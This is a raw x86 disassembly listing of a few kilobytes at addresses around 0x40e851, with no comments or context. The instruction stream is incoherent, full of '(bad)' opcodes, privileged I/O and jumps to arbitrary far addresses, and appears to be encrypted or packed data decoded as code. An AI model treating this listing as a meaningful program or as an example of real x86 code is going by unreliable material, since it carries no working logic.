  40e851:	in     al,0x53
  40e853:	ds pop esp
  40e855:	mov    esp,0x8d72a52b
  40e85a:	xlat   BYTE PTR ds:[ebx]
  40e85b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e85c:	push   esp
  40e85d:	rcr    BYTE PTR [eax+ebx*2],0xbe
  40e861:	fwait
  40e862:	jbe    0x40e8a0
  40e864:	push   esp
  40e865:	pop    ebp
  40e866:	mov    bl,BYTE PTR [ebx]
  40e868:	xor    bl,BYTE PTR [ecx]
  40e86a:	lods   al,BYTE PTR ds:[esi]
  40e86b:	mov    WORD PTR [ebp+0x2a],es
  40e86e:	data16 fcom QWORD PTR [edx+0x4]
  40e872:	icebp  
  40e873:	add    ecx,edi
  40e875:	scas   al,BYTE PTR es:[edi]
  40e876:	inc    ecx
  40e877:	(bad)  [ebp+0x20]
  40e87a:	and    eax,0xa7ac789e
  40e87f:	stos   BYTE PTR es:[edi],al
  40e880:	call   0x3410:0xd7082f50
  40e887:	pop    esi
  40e888:	fiadd  WORD PTR [esp+ebx*1-0x34e35b08]
  40e88f:	push   ss
  40e890:	int3   
  40e891:	push   esi
  40e892:	sub    eax,0xc58ae004
  40e897:	sbb    ecx,DWORD PTR [edi]
  40e899:	mov    bh,0x59
  40e89b:	sbb    DWORD PTR ds:0xca1c6741,0xf60e4f90
  40e8a5:	pop    ss
  40e8a6:	mov    dl,0x8
  40e8a8:	hlt    
  40e8a9:	push   ebx
  40e8aa:	std    
  40e8ab:	div    DWORD PTR [edi]
  40e8ad:	in     eax,0x11
  40e8af:	xlat   BYTE PTR ds:[ebx]
  40e8b0:	xchg   edx,eax
  40e8b1:	dec    edi
  40e8b2:	ins    BYTE PTR es:[edi],dx
  40e8b3:	jns    0x40e91d
  40e8b5:	jns    0x40e885
  40e8b7:	ror    edx,0xe6
  40e8ba:	mov    esi,0xf1ac005f
  40e8bf:	data16 adc al,0x46
  40e8c2:	fisub  WORD PTR [edi]
  40e8c4:	mov    ebp,0x24767a73
  40e8c9:	stc    
  40e8ca:	retf   
  40e8cb:	sbb    BYTE PTR [edx-0x14c3c20a],cl
  40e8d1:	cs inc ebp
  40e8d3:	cmc    
  40e8d4:	sub    BYTE PTR [esi],ch
  40e8d6:	mov    dl,0x1a
  40e8d8:	(bad)  
  40e8d9:	push   eax
  40e8da:	jmp    0x40ede5
  40e8df:	ds (bad) 
  40e8e1:	sar    BYTE PTR [edi],cl
  40e8e3:	(bad)  
  40e8e5:	rol    ebp,1
  40e8e7:	imul   edi,DWORD PTR [ebp+0x660e749e],0x4904b68d
  40e8f1:	js     0x40e96b
  40e8f3:	push   0x7c
  40e8f5:	js     0x40e96f
  40e8f7:	push   ebp
  40e8f8:	or     BYTE PTR [edx],dl
  40e8fa:	pop    esp
  40e8fb:	nop
  40e8fc:	xchg   ebp,eax
  40e8fd:	pop    ds
  40e8fe:	push   ebx
  40e8ff:	out    dx,al
  40e900:	enter  0x50f4,0xe1
  40e904:	test   al,0xf4
  40e906:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e907:	in     ax,0x37
  40e90a:	aas    
  40e90b:	adc    al,0x26
  40e90d:	mov    ah,0x19
  40e90f:	push   ds
  40e910:	lea    esi,[ecx+0x5f]
  40e913:	xor    ebp,DWORD PTR [ebx]
  40e915:	adc    ecx,ebp
  40e917:	jmp    FWORD PTR [ebx+0x20]
  40e91a:	ins    BYTE PTR es:[edi],dx
  40e91b:	push   ecx
  40e91c:	cmp    DWORD PTR [ebx-0x7ebc5fb0],eax
  40e922:	jmp    0x40e8dd
  40e924:	cli    
  40e925:	sub    DWORD PTR [ebx+0x4ac06d21],ebx
  40e92b:	pushf  
  40e92c:	sbb    eax,0x8234b710
  40e931:	mov    dh,0x47
  40e933:	popf   
  40e934:	inc    edx
  40e935:	ret    
  40e936:	mov    WORD PTR [esi+0x5d],cs
  40e939:	aas    
  40e93a:	fwait
  40e93b:	sub    DWORD PTR [ecx+edi*2],esi
  40e93e:	xor    eax,0xa9af53b7
  40e943:	inc    ebx
  40e944:	fcos   
  40e946:	imul   bx,WORD PTR [edi],0x35
  40e94a:	cmp    eax,0xa086d8c0
  40e94f:	or     DWORD PTR [eax+0x4ccf5f09],ebx
  40e955:	jnp    0x40e947
  40e957:	enter  0xc852,0x7a
  40e95b:	sbb    cl,dh
  40e95d:	scas   eax,DWORD PTR es:[edi]
  40e95e:	pushf  
  40e95f:	(bad)  
  40e960:	mov    esp,0x771edae5
  40e965:	loope  0x40e9bd
  40e967:	jl     0x40e9b3
  40e969:	add    DWORD PTR [ebx-0x3909d008],ebp
  40e96f:	aad    0x9e
  40e971:	repz xor bl,al
  40e974:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e975:	shl    BYTE PTR [edx+0x4e],1
  40e978:	sub    esi,DWORD PTR [esi+edi*1+0x1f]
  40e97c:	(bad)  
  40e97d:	xchg   ecx,eax
  40e97e:	rcl    DWORD PTR [ecx+0x6085c2a6],0x71
  40e985:	test   ebx,ebp
  40e987:	(bad)  
  40e988:	sbb    BYTE PTR [edx+0x38117e56],dh
  40e98e:	div    edi
  40e990:	jecxz  0x40e943
  40e992:	outs   dx,DWORD PTR ds:[esi]
  40e993:	mov    edx,0x1adf5696
  40e998:	retf   0xbde3
  40e99b:	test   DWORD PTR [ecx-0x13],ecx
  40e99e:	push   cs
  40e99f:	or     ah,bh
  40e9a1:	bound  ebp,QWORD PTR [ebx]
  40e9a3:	mov    ch,0x8a
  40e9a5:	add    dh,BYTE PTR [esi]
  40e9a7:	leave  
  40e9a8:	add    eax,0x6e774716
  40e9ad:	enter  0x2685,0xa4
  40e9b1:	cmc    
  40e9b2:	fs loopne 0x40e9fe
  40e9b5:	cld    
  40e9b6:	into   
  40e9b7:	xor    BYTE PTR [eax+0x24469440],ah
  40e9bd:	sbb    eax,0x7bf35e0b
  40e9c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e9c3:	test   DWORD PTR [esi+0x6e00462a],ebp
  40e9c9:	mov    al,0x64
  40e9cb:	nop
  40e9cc:	shr    DWORD PTR es:[ebx],0xb7
  40e9d0:	dec    eax
  40e9d1:	mov    ecx,0x24f8630
  40e9d6:	pop    eax
  40e9d7:	leave  
  40e9d8:	rol    DWORD PTR [eax],0x49
  40e9db:	int3   
  40e9dc:	push   ds
  40e9dd:	mov    ebp,0x5d88782a
  40e9e2:	dec    eax
  40e9e3:	ja     0x40e9e1
  40e9e5:	pop    esi
  40e9e6:	sbb    DWORD PTR [edx+esi*2+0x16],ebp
  40e9ea:	jmp    0x44185c05
  40e9ef:	sbb    ebx,DWORD PTR [edi-0x3c6f9e50]
  40e9f5:	xchg   ebp,eax
  40e9f6:	cli    
  40e9f7:	jns    0x40e9f2
  40e9f9:	sbb    ecx,edx
  40e9fb:	xor    BYTE PTR [ecx+0x61f23d70],ah
  40ea01:	stc    
  40ea02:	cld    
  40ea03:	test   eax,0x5545a3d6
  40ea08:	mov    cl,ch
  40ea0a:	ds sub eax,0x1e88944d
  40ea10:	or     dl,BYTE PTR [edx-0x5f]
  40ea13:	sbb    BYTE PTR [ebx+esi*4+0x5],dh
  40ea17:	push   0x1a4f00aa
  40ea1c:	sub    ebp,ebx
  40ea1e:	adc    DWORD PTR [edx+esi*2-0x68db3f6],ebx
  40ea25:	setbe  ch
  40ea28:	cmp    al,0x2d
  40ea2a:	int    0x9
  40ea2c:	adc    DWORD PTR [edi+0x5f],eax
  40ea2f:	mov    edi,0x1033d4e1
  40ea34:	test   al,0xb6
  40ea36:	mov    edx,0xad83e6b4
  40ea3b:	leave  
  40ea3c:	iret   
  40ea3d:	ror    ebp,0x5e
  40ea40:	mov    esi,0xa831cc14
  40ea45:	mov    al,0x98
  40ea47:	cmp    BYTE PTR [edx-0x1719109d],ah
  40ea4d:	push   ds
  40ea4e:	push   edi
  40ea4f:	pop    ds
  40ea50:	mov    esp,DWORD PTR [ebx+eiz*2-0x2704fc61]
  40ea57:	pop    ecx
  40ea58:	mov    DWORD PTR [esp+ebp*8],edi
  40ea5b:	pop    ecx
  40ea5c:	(bad)  
  40ea5d:	scas   eax,DWORD PTR es:[edi]
  40ea5e:	adc    eax,0x48ba5966
  40ea63:	add    ecx,DWORD PTR [ebp-0x62b28d62]
  40ea69:	out    0x24,al
  40ea6b:	mov    ecx,0x25a1ea5d
  40ea70:	xchg   edi,eax
  40ea71:	out    dx,eax
  40ea72:	cmc    
  40ea73:	data16 and al,0xb4
  40ea76:	mul    ah
  40ea78:	sub    dh,bl
  40ea7a:	ret    
  40ea7b:	pop    edi
  40ea7c:	mov    WORD PTR [ecx-0x618e1e14],gs
  40ea82:	mul    DWORD PTR [ebp-0x1b]
  40ea85:	jnp    0x40ead2
  40ea87:	dec    ebx
  40ea88:	xchg   ebp,eax
  40ea89:	stos   DWORD PTR es:[edi],eax
  40ea8a:	fist   WORD PTR [ecx+0x1a]
  40ea8d:	cmc    
  40ea8e:	dec    ebx
  40ea8f:	push   es
  40ea90:	sbb    DWORD PTR [ecx+0x2748504d],ecx
  40ea96:	push   ss
  40ea97:	jmp    0x40ea56
  40ea99:	mov    ecx,0x6e3786b6
  40ea9e:	cmp    al,0xa8
  40eaa0:	xchg   ebx,eax
  40eaa1:	mov    cl,0xdc
  40eaa3:	fiadd  DWORD PTR [ebx]
  40eaa5:	pop    ds
  40eaa6:	daa    
  40eaa7:	lds    edi,FWORD PTR [edi-0x55]
  40eaaa:	sbb    eax,0xba0b499c
  40eaaf:	cmc    
  40eab0:	fnstcw WORD PTR [ecx]
  40eab2:	and    DWORD PTR [edi],ebp
  40eab4:	daa    
  40eab5:	scas   eax,DWORD PTR es:[edi]
  40eab6:	and    eax,0x706b9a79
  40eabb:	xchg   esi,eax
  40eabc:	sbb    al,0xbd
  40eabe:	and    edi,DWORD PTR fs:[edi+0x53]
  40eac2:	loope  0x40eb43
  40eac4:	or     ebp,DWORD PTR [ebp+0x4b24d6b5]
  40eaca:	and    DWORD PTR [ecx-0x62],ecx
  40eacd:	cdq    
  40eace:	jo     0x40eae8
  40ead0:	int3   
  40ead1:	sub    cl,ch
  40ead3:	fsubr  DWORD PTR [esi-0x19c12341]
  40ead9:	pop    edi
  40eada:	adc    al,0x45
  40eadc:	xlat   BYTE PTR ds:[ebx]
  40eadd:	imul   ecx,ebp,0xba8d7734
  40eae3:	scas   eax,DWORD PTR es:[edi]
  40eae4:	rcl    BYTE PTR [ecx-0x21],0x2f
  40eae8:	js     0x40eb46
  40eaea:	and    BYTE PTR ds:0xa3da4b8e,ah
  40eaf0:	dec    ebp
  40eaf1:	sub    eax,DWORD PTR [esi]
  40eaf3:	and    DWORD PTR [edi-0x5e988c69],0x823a7383
  40eafd:	rcl    DWORD PTR [edx-0x601ca86c],0xfe
  40eb04:	shl    DWORD PTR [ebp-0x45],0xcb
  40eb08:	out    dx,al
  40eb09:	dec    edi
  40eb0a:	aad    0xc2
  40eb0c:	mov    eax,ds:0xf435aae5
  40eb11:	jbe    0x40ead4
  40eb13:	xor    bl,al
  40eb15:	xchg   BYTE PTR ds:0x585ec63c,bl
  40eb1b:	arpl   bx,si
  40eb1d:	dec    ebp
  40eb1e:	mov    esp,0x3c643965
  40eb23:	sti    
  40eb24:	jmp    0x924d3f4
  40eb29:	iret   
  40eb2a:	push   cs
  40eb2b:	cmp    BYTE PTR [eax+ebx*1-0x60],ah
  40eb2f:	mov    ?,WORD PTR [ecx]
  40eb31:	inc    ebx
  40eb32:	fisttp DWORD PTR [ecx]
  40eb34:	retf   0xff8e
  40eb37:	mov    edx,0xd7908b57
  40eb3c:	xchg   edi,eax
  40eb3d:	pop    edi
  40eb3e:	nop
  40eb3f:	call   0x2bda:0xc0d0a75a
  40eb46:	retf   0x63f4
  40eb49:	cli    
  40eb4a:	sbb    eax,0xe38d42aa
  40eb4f:	imul   ebx,DWORD PTR [ebx+0x757cdaa7],0x66a88c5d
  40eb59:	or     ah,ch
  40eb5b:	sub    esp,DWORD PTR [eax-0x28e26c69]
  40eb61:	mov    bl,0x95
  40eb63:	mov    bh,BYTE PTR [esi+0x1475c149]
  40eb69:	in     eax,dx
  40eb6a:	into   
  40eb6b:	add    bl,BYTE PTR [edx+0x3]
  40eb6e:	into   
  40eb6f:	jecxz  0x40eb2e
  40eb71:	repz into 
  40eb73:	push   ecx
  40eb74:	dec    esi
  40eb75:	dec    ecx
  40eb76:	jle    0x40eb77
  40eb78:	je     0x40eb5c
  40eb7a:	retf   
  40eb7b:	cmp    DWORD PTR [ecx-0x584ca1be],0xc9d98202
  40eb85:	jnp    0x40eb37
  40eb87:	das    
  40eb88:	into   
  40eb89:	jp     0x40ebc8
  40eb8b:	nop    edx
  40eb8e:	jg     0x40ec00
  40eb90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eb91:	out    dx,eax
  40eb92:	push   edi
  40eb93:	in     eax,dx
  40eb94:	inc    edx
  40eb95:	lock inc eax
  40eb97:	loopne 0x40ebc6
  40eb99:	retf   
  40eb9a:	push   edx
  40eb9b:	inc    esi
  40eb9c:	leave  
  40eb9d:	or     al,0xb0
  40eb9f:	xchg   edx,eax
  40eba0:	adc    bl,0x90
  40eba3:	test   al,0xd0
  40eba5:	sar    eax,cl
  40eba7:	and    BYTE PTR [edi-0x7d015ad5],ch
  40ebad:	mov    edx,0xa0b9825
  40ebb2:	test   DWORD PTR [ecx],0x558ec1cd
  40ebb8:	lahf   
  40ebb9:	mov    eax,0x2eec21a5
  40ebbe:	test   al,0x81
  40ebc0:	pop    edi
  40ebc1:	push   es
  40ebc2:	sub    BYTE PTR [eax-0x28],ah
  40ebc5:	add    DWORD PTR [eax+0x7b],eax
  40ebc8:	add    al,0x40
  40ebca:	and    bh,BYTE PTR [ebp+0x2f]
  40ebcd:	mov    dl,0x85
  40ebcf:	pop    esi
  40ebd0:	pop    edi
  40ebd1:	fisttp WORD PTR [edx+0x5c]
  40ebd4:	jnp    0x40ebc7
  40ebd6:	adc    esp,DWORD PTR [ebp-0x59034099]
  40ebdc:	inc    esp
  40ebdd:	or     cl,BYTE PTR [esi+0x3decedc5]
  40ebe3:	mov    esp,0xb7dcfd24
  40ebe8:	out    0xc4,eax
  40ebea:	mov    ?,WORD PTR [esi]
  40ebec:	mov    ecx,ebp
  40ebee:	gs (bad) 
  40ebf0:	mov    esp,0x14f8fe82
  40ebf5:	popf   
  40ebf6:	pop    ss
  40ebf7:	retf   0x27ab
  40ebfa:	ret    
  40ebfb:	es sti 
  40ebfd:	nop
  40ebfe:	jmp    0x184d:0x336d6377
  40ec05:	out    0xd3,eax
  40ec07:	(bad)  
  40ec08:	fisubr WORD PTR [edi]
  40ec0a:	in     eax,dx
  40ec0b:	mov    ebx,0xa4026056
  40ec10:	pop    es
  40ec11:	jbe    0x40ec8a
  40ec13:	cld    
  40ec14:	stos   BYTE PTR es:[edi],al
  40ec15:	add    eax,0x814aa35
  40ec1a:	div    DWORD PTR [ebx-0x67130ff9]
  40ec20:	ds xchg esp,eax
  40ec22:	leave  
  40ec23:	mov    bh,0xba
  40ec25:	xor    al,0x74
  40ec27:	mov    es,WORD PTR ds:0xa366947d
  40ec2d:	add    ebp,esi
  40ec2f:	bound  esi,QWORD PTR [edi-0x5b6f94cb]
  40ec35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ec36:	dec    edi
  40ec37:	imul   esp,DWORD PTR [eax+0x6b889093],0x5f3c67c3
  40ec41:	cmc    
  40ec42:	xchg   ebp,eax
  40ec43:	xor    al,0x47
  40ec45:	lods   al,BYTE PTR ds:[esi]
  40ec46:	fisttp DWORD PTR [esi-0x54847f33]
  40ec4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ec4d:	stos   BYTE PTR es:[edi],al
  40ec4e:	jle    0x40ecba
  40ec50:	jecxz  0x40ebf6
  40ec52:	add    esi,DWORD PTR [esi]
  40ec54:	lea    edx,[edx]
  40ec56:	jno    0x40ec86
  40ec58:	jp     0x40ecbd
  40ec5a:	cmp    al,BYTE PTR ss:[ebp+0x1e]
  40ec5e:	jp     0x40ecaa
  40ec60:	inc    esp
  40ec61:	and    edi,edi
  40ec63:	mov    ebp,0x67f056e7
  40ec68:	adc    DWORD PTR [eax+0x17a4b5e5],0x0
  40ec6f:	adc    DWORD PTR [esi+0x5c],0xffffffb4
  40ec73:	push   esi
  40ec74:	dec    ecx
  40ec75:	fs dec esi
  40ec77:	mov    ebx,0x85aeefd8
  40ec7c:	xchg   edx,eax
  40ec7d:	pop    ecx
  40ec7f:	mov    eax,0xad8d100c
  40ec84:	fisubr WORD PTR [ecx+edx*2+0x78ade692]
  40ec8b:	inc    edx
  40ec8c:	sub    al,0xae
  40ec8e:	dec    esp
  40ec8f:	loop   0x40ecf8
  40ec91:	mov    ebx,0x70ed858c
  40ec96:	mov    dh,0x69
  40ec98:	cmp    DWORD PTR [edi],edx
  40ec9a:	jno    0x40ecb3
  40ec9c:	cmp    ch,BYTE PTR [edx+0x14eb1b82]
  40eca2:	or     BYTE PTR [edi-0x40],0xc2
  40eca6:	xor    al,BYTE PTR [eax]
  40eca8:	mov    ebp,0xfa3109ab
  40ecad:	adc    al,0x23
  40ecaf:	inc    edx
  40ecb0:	xchg   ebx,eax
  40ecb1:	into   
  40ecb2:	lahf   
  40ecb3:	push   ss
  40ecb4:	and    ch,BYTE PTR [edx+0x5bb42334]
  40ecba:	sub    eax,0xde43812f
  40ecbf:	pop    ss
  40ecc0:	xor    eax,0xa321e407
  40ecc5:	iret   
  40ecc6:	push   cs
  40ecc7:	jg     0x40ed24
  40ecc9:	fidivr WORD PTR [ebx+0x32]
  40eccc:	xchg   edi,eax
  40eccd:	push   edi
  40ecce:	add    eax,0xdc1bc9eb
  40ecd3:	cmp    bh,dh
  40ecd5:	mov    ebp,0xa41c03bd
  40ecda:	call   0x101f10a4
  40ecdf:	pop    ebx
  40ece0:	outs   dx,BYTE PTR ds:[esi]
  40ece1:	add    esp,esp
  40ece3:	(bad)  
  40ece4:	cmp    ah,al
  40ece6:	mov    ch,0xe4
  40ece8:	(bad)  
  40ece9:	adc    al,BYTE PTR [ebp+0x1b88f1eb]
  40ecef:	mov    ds:0x68378c24,eax
  40ecf4:	(bad)  
  40ecf5:	ror    BYTE PTR [ecx],0xb4
  40ecf8:	xor    BYTE PTR [edx],cl
  40ecfa:	push   esi
  40ecfb:	or     al,0xc9
  40ecfd:	cli    
  40ecfe:	cmc    
  40ecff:	fldcw  WORD PTR [ebx-0x26d1ee0e]
  40ed05:	pop    ss
  40ed06:	or     DWORD PTR [edi+eiz*1],0x47
  40ed0a:	mov    ds:0xf271d196,al
  40ed0f:	xchg   ebp,eax
  40ed10:	adc    edx,DWORD PTR [ecx+esi*4]
  40ed13:	mov    al,ds:0xf463682c
  40ed18:	retf   0x1e9a
  40ed1b:	and    eax,0xc103479
  40ed20:	dec    ebp
  40ed21:	stos   BYTE PTR es:[edi],al
  40ed22:	inc    esi
  40ed23:	sbb    eax,ebx
  40ed25:	cdq    
  40ed26:	dec    eax
  40ed27:	sbb    BYTE PTR [edi],cl
  40ed29:	push   ecx
  40ed2a:	test   DWORD PTR [eax],eax
  40ed2c:	ins    BYTE PTR es:[edi],dx
  40ed2d:	sbb    edi,0xa623cbcf
  40ed33:	test   eax,0x9ffe8444
  40ed38:	push   ds
  40ed39:	mov    esi,0x66226411
  40ed3e:	fsub   QWORD PTR [edi]
  40ed40:	cmp    eax,eax
  40ed42:	hlt    
  40ed43:	mov    ds:0xbbb9b8fa,al
  40ed48:	data16 idiv BYTE PTR [ebx-0xddb4e70]
  40ed4f:	pop    edi
  40ed50:	jnp    0x40ed89
  40ed52:	and    al,0xc4
  40ed54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ed55:	and    ebp,DWORD PTR [edi+0xe357046]
  40ed5b:	and    al,0x20
  40ed5d:	push   ecx
  40ed5e:	hlt    
  40ed5f:	fwait
  40ed60:	jne    0x40ecf9
  40ed62:	cmp    al,0x26
  40ed64:	aam    0x43
  40ed66:	dec    ebx
  40ed67:	(bad)  
  40ed68:	test   esp,esp
  40ed6a:	retf   0xfc7b
  40ed6d:	(bad)  
  40ed6e:	sbb    BYTE PTR [ebp+0x15d222e7],dh
  40ed74:	loopne 0x40ed52
  40ed76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ed77:	mov    al,ds:0xb81764d6
  40ed7c:	inc    ecx
  40ed7d:	dec    ebp
  40ed7e:	call   0xa3ae:0x896864cb
  40ed85:	or     BYTE PTR [eax+0x12c64af5],ch
  40ed8b:	pop    es
  40ed8c:	cld    
  40ed8d:	jo     0x40edb2
  40ed8f:	pop    ss
  40ed90:	jb     0x40ee04
  40ed92:	mov    bh,0xdc
  40ed94:	add    eax,DWORD PTR [eax-0x58]
  40ed97:	xchg   ebp,eax
  40ed98:	je     0x40ed7f
  40ed9a:	loopne 0x40ed32
  40ed9c:	mov    esi,0x6ccf3d41
  40eda1:	jmp    0x40ee20
  40eda3:	(bad)  
  40eda4:	xor    BYTE PTR [edx-0x55],ch
  40eda7:	xor    al,0x71
  40eda9:	push   ebp
  40edaa:	xor    dl,BYTE PTR ds:0x2e47ad78
  40edb0:	mov    ds:0x85d7063e,al
  40edb5:	xchg   esp,eax
  40edb6:	test   al,0xfa
  40edb8:	jge    0x40ed5b
  40edba:	data16 mov dh,0x71
  40edbd:	mov    dh,0x7d
  40edbf:	and    DWORD PTR [ebx],ebp
  40edc1:	mov    BYTE PTR [edi-0x79f18320],ah
  40edc7:	fcom   DWORD PTR [edi+0x78]
  40edca:	sbb    DWORD PTR [ebp+0xfafd315],ecx
  40edd0:	xlat   BYTE PTR ds:[ebx]
  40edd1:	jae    0x40edad
  40edd3:	in     al,0xb2
  40edd5:	imul   edx,DWORD PTR [ebp-0x37],0x34
  40edd9:	sbb    al,0x71
  40eddb:	mov    DWORD PTR [ecx],ecx
  40eddd:	enter  0xf589,0x7b
  40ede1:	cmp    BYTE PTR [edx+0x6d],ah
  40ede4:	mov    ecx,0xe9e4458b
  40ede9:	push   es
  40edea:	add    eax,0xcfcf0000
  40edef:	rol    bl,cl
  40edf1:	rol    cl,cl
  40edf3:	int    0xd3
  40edf5:	fldenv [ebp-0x539f693]
  40edfb:	and    DWORD PTR [edx+0x76],edi
  40edfe:	dec    ebp
  40edff:	js     0x40ee79
  40ee01:	push   0x7c
  40ee03:	js     0x40ee7d
  40ee05:	fwait
  40ee06:	jle    0x40ee10
  40ee08:	mov    ch,0xa5
  40ee0a:	jno    0x40ee3f
  40ee0c:	sub    DWORD PTR [eax],esi
  40ee0e:	mov    esi,0x298614fd
  40ee13:	sub    eax,0x1b544d82
  40ee18:	sub    DWORD PTR [ecx],0xffffffc6
  40ee1b:	and    esi,esi
  40ee1d:	ret    0xdb75
  40ee20:	mov    cl,0x6c
  40ee22:	or     BYTE PTR [edx-0x183edaa],ch
  40ee28:	in     al,0x23
  40ee2a:	stos   BYTE PTR es:[edi],al
  40ee2b:	add    eax,0xffffffb6
  40ee2e:	mov    BYTE PTR [edi],ah
  40ee30:	fadd   st,st(1)
  40ee32:	sti    
  40ee33:	daa    
  40ee34:	mov    ?,WORD PTR [ecx+0xb]
  40ee37:	popf   
  40ee38:	(bad)  
  40ee39:	test   DWORD PTR ds:0x9d22fbe8,0x90adf905
  40ee43:	ror    DWORD PTR [esi+ecx*4-0x391d1809],0x9e
  40ee4b:	int    0xaa
  40ee4d:	jnp    0x40ee7a
  40ee4f:	jle    0x40eea7
  40ee51:	pop    edi
  40ee52:	ins    DWORD PTR es:[edi],dx
  40ee53:	ds into 
  40ee55:	popf   
  40ee56:	sub    ebp,DWORD PTR ds:0x5fcf6770
  40ee5c:	adc    BYTE PTR [ecx-0x38],0x57
  40ee60:	ins    DWORD PTR es:[edi],dx
  40ee61:	call   DWORD PTR [ebp+0x2c]
  40ee64:	(bad)  
  40ee65:	mov    BYTE PTR [ecx-0x4f],ah
  40ee68:	stos   DWORD PTR es:[edi],eax
  40ee69:	or     BYTE PTR [edi+0x34],ah
  40ee6c:	inc    edi
  40ee6d:	dec    edi
  40ee6e:	jns    0x40ee08
  40ee70:	in     al,0x38
  40ee72:	adc    DWORD PTR [eax+ecx*8+0x34],edi
  40ee76:	mov    esp,?
  40ee78:	fsub   QWORD PTR [esi+0x23fb3e14]
  40ee7e:	outs   dx,BYTE PTR ds:[esi]
  40ee7f:	mov    BYTE PTR [ecx],bl
  40ee81:	cmp    eax,0xef22980f
  40ee86:	scas   eax,DWORD PTR es:[edi]
  40ee87:	ins    BYTE PTR es:[edi],dx
  40ee88:	dec    ah
  40ee8a:	clc    
  40ee8b:	jae    0x40ef02
  40ee8d:	adc    al,0x16
  40ee8f:	call   0xbca3199
  40ee94:	out    dx,al
  40ee95:	push   0x5286701a
  40ee9a:	stos   DWORD PTR es:[edi],eax
  40ee9b:	sbb    ah,BYTE PTR [ecx+0x79005310]
  40eea1:	mov    al,ds:0x6279b60b
  40eea6:	ss ja  0x40eea8
  40eea9:	mov    bh,0xdd
  40eeab:	add    BYTE PTR [ebx-0x595ae049],dl
  40eeb1:	cmp    BYTE PTR [ecx],bh
  40eeb3:	ret    0x4178
  40eeb6:	xor    ebp,ebx
  40eeb8:	pop    ebx
  40eeb9:	iret   
  40eeba:	mov    bl,0x63
  40eebc:	rol    DWORD PTR [edx-0x3c],0x52
  40eec0:	sbb    edi,DWORD PTR [ebp+esi*2-0x35b4c8a6]
  40eec7:	ins    BYTE PTR es:[edi],dx
  40eec8:	arpl   WORD PTR [esi],ax
  40eeca:	xchg   DWORD PTR [eax-0x61e4e4bb],edx
  40eed0:	xor    BYTE PTR [ebp+0x50006551],ah
  40eed6:	outs   dx,BYTE PTR ds:[esi]
  40eed7:	(bad)  
  40eed8:	rcl    al,cl
  40eeda:	sbb    esi,DWORD PTR [ebx]
  40eedc:	std    
  40eedd:	test   eax,0x972e3c7d
  40eee2:	mov    al,0xdd
  40eee4:	add    cl,0xf8
  40eee7:	pop    edx
  40eee8:	js     0x40eee2
  40eeea:	(bad)  
  40eeeb:	dec    esi
  40eeec:	in     eax,0x2a
  40eeee:	jecxz  0x40ef4b
  40eef0:	test   eax,0xe4684452
  40eef5:	fwait
  40eef6:	arpl   WORD PTR [ebx],cx
  40eef8:	lds    esp,FWORD PTR [esi-0x74]
  40eefb:	fwait
  40eefc:	es sbb dh,bl
  40eeff:	rcl    DWORD PTR [edi],0xc6
  40ef02:	mov    edi,0x23f7dc37
  40ef07:	retf   
  40ef08:	lds    edx,FWORD PTR [edi-0x3c]
  40ef0b:	cwde   
  40ef0c:	adc    eax,ecx
  40ef0e:	xchg   DWORD PTR [edx-0x4e2eae58],ecx
  40ef14:	jge    0x40eeb6
  40ef16:	jne    0x40eea0
  40ef18:	dec    eax
  40ef19:	sub    BYTE PTR fs:[edx-0x12ba7028],dh
  40ef20:	pushf  
  40ef21:	cmp    eax,0xae74de8c
  40ef26:	sbb    ebp,ecx
  40ef28:	add    eax,0xd913c627
  40ef2d:	mov    al,0x73
  40ef2f:	cs popa 
  40ef31:	inc    esi
  40ef32:	int    0x61
  40ef34:	push   0xe749249a
  40ef39:	fiadd  DWORD PTR [ebx]
  40ef3b:	jne    0x40ef7c
  40ef3d:	cs inc ebx
  40ef3f:	(bad)  
  40ef40:	out    dx,al
  40ef41:	out    dx,al
  40ef42:	push   ecx
  40ef43:	dec    cx
  40ef45:	push   cs
  40ef46:	mov    BYTE PTR ds:0x2bde383e,bh
  40ef4c:	xor    al,0x5b
  40ef4e:	into   
  40ef4f:	jb     0x40efa0
  40ef51:	call   0x44a3:0x7acb2779
  40ef58:	popa   
  40ef59:	mov    ds:0x25894d6c,eax
  40ef5e:	(bad)  
  40ef5f:	mov    al,ds:0x549d9e98
  40ef64:	inc    esi
  40ef65:	push   ecx
  40ef66:	dec    esi
  40ef67:	ins    DWORD PTR es:[edi],dx
  40ef68:	add    DWORD PTR [eax+0x16f32149],ecx
  40ef6e:	(bad)  
  40ef6f:	dec    esi
  40ef70:	je     0x40ef1b
  40ef72:	cmp    al,0xcf
  40ef74:	inc    ebx
  40ef75:	xor    bl,al
  40ef77:	lds    ebx,FWORD PTR [ecx]
  40ef79:	jl     0x40efa1
  40ef7b:	cmp    DWORD PTR [edi+0x1ccf75cf],eax
  40ef81:	adc    ebp,eax
  40ef83:	cld    
  40ef84:	jle    0x40efaa
  40ef86:	cmp    BYTE PTR [esi+edx*1-0x4a],bh
  40ef8a:	jp     0x40ef3f
  40ef8c:	into   
  40ef8d:	outs   dx,DWORD PTR ds:[esi]
  40ef8e:	xchg   ebp,eax
  40ef8f:	xor    edx,esi
  40ef91:	or     bl,BYTE PTR [ebp-0x49]
  40ef94:	push   0x49fb05b
  40ef99:	lds    esi,FWORD PTR [esi+eiz*1-0x46]
  40ef9d:	clc    
  40ef9e:	mov    ecx,0x7260054f
  40efa3:	mov    eax,0x3374eba
  40efa8:	sbb    BYTE PTR [ebx+0x68],cl
  40efab:	jl     0x40ef4a
  40efad:	int    0x49
  40efaf:	test   BYTE PTR [edx+eax*1-0x2c610bb0],0x40
  40efb7:	cdq    
  40efb8:	and    DWORD PTR [eax],0xca4f8691
  40efbe:	mov    ds:0x8f2c3fb1,eax
  40efc3:	mov    ds:0x26eba9a,eax
  40efc8:	xchg   ebx,eax
  40efc9:	mov    ecx,0xd3937e2b
  40efce:	jmp    0xdd71:0xadbe0982
  40efd5:	ret    
  40efd6:	sahf   
  40efd7:	test   eax,0x423fdb38
  40efdc:	cmp    al,dh
  40efde:	rcl    DWORD PTR [ebp+0x333d8854],1
  40efe4:	stos   DWORD PTR es:[edi],eax
